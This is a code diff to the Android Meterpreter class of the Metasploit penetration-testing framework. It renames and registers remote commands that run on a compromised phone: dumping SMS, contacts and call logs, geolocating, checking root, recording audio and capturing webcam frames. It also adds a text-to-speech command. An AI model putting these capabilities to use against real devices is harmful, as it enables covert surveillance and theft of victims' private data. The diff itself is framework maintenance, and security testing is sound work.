@@ -34,13 +34,20 @@ import com.metasploit.meterpreter.stdapi.stdapi_net_config_get_routes_V1_4;
 import com.metasploit.meterpreter.stdapi.stdapi_net_socket_tcp_shutdown_V1_3;
 import com.metasploit.meterpreter.stdapi.stdapi_sys_config_getuid;
 import com.metasploit.meterpreter.stdapi.stdapi_sys_process_execute_V1_3;
+import com.metasploit.meterpreter.android.stdapi_sys_config_sysinfo;
 
-import com.metasploit.meterpreter.android.check_root_android;
-import com.metasploit.meterpreter.android.dump_calllog_android;
-import com.metasploit.meterpreter.android.dump_contacts_android;
-import com.metasploit.meterpreter.android.dump_sms_android;
-import com.metasploit.meterpreter.android.geolocate_android;
-import com.metasploit.meterpreter.android.stdapi_sys_config_sysinfo_android;
+import com.metasploit.meterpreter.android.check_root;
+import com.metasploit.meterpreter.android.dump_calls;
+import com.metasploit.meterpreter.android.dump_contacts;
+import com.metasploit.meterpreter.android.dump_sms;
+import com.metasploit.meterpreter.android.geolocate;
+// import com.metasploit.meterpreter.android.set_volume;
+import com.metasploit.meterpreter.android.speak;
+// import com.metasploit.meterpreter.android.vibrate;
+
+// import com.metasploit.meterpreter.android.enum_apps;
+// import com.metasploit.meterpreter.android.enum_activities;
+// import com.metasploit.meterpreter.android.launch_intent;
 
 public class AndroidMeterpreter extends Meterpreter {
 
@@ -84,18 +91,29 @@ public class AndroidMeterpreter extends Meterpreter {
         mgr.registerCommand("stdapi_sys_config_sysinfo", stdapi_sys_config_sysinfo_android.class);
         mgr.registerCommand("stdapi_sys_process_execute", stdapi_sys_process_execute_V1_3.class);
         mgr.registerCommand("stdapi_sys_process_get_processes", stdapi_sys_process_get_processes_android.class);
+
         if (context != null) {
             mgr.registerCommand("webcam_audio_record", webcam_audio_record_android.class);
             mgr.registerCommand("webcam_list", webcam_list_android.class);
             mgr.registerCommand("webcam_start", webcam_start_android.class);
             mgr.registerCommand("webcam_stop", webcam_stop_android.class);
             mgr.registerCommand("webcam_get_frame", webcam_get_frame_android.class);
-            mgr.registerCommand("dump_sms", dump_sms_android.class);
-            mgr.registerCommand("dump_contacts", dump_contacts_android.class);
-            mgr.registerCommand("geolocate", geolocate_android.class);
-            mgr.registerCommand("dump_calllog", dump_calllog_android.class);
-            mgr.registerCommand("check_root", check_root_android.class);
+            mgr.registerCommand("dump_sms", dump_sms.class);
+            mgr.registerCommand("dump_contacts", dump_contacts.class);
+            mgr.registerCommand("geolocate", geolocate.class);
+            mgr.registerCommand("dump_calls", dump_calls.class);
+            mgr.registerCommand("check_root", check_root.class);
         }
+
+        // mgr.registerCommand("enum_apps", enum_apps.class);
+        // mgr.registerCommand("enum_activities", enum_activities.class);
+        mgr.registerCommand("speak", speak.class);
+        // mgr.registerCommand("launch_intent", launch_intent.class);
+        // mgr.registerCommand("check_permissions", launch_intent.class);
+        // mgr.registerCommand("set_volume", launch_intent.class);
+        // mgr.registerCommand("vibrate", launch_intent.class);
+        // mgr.registerCommand("call", launch_intent.class);
+
         return getCommandManager().getNewCommands();
     }
 }
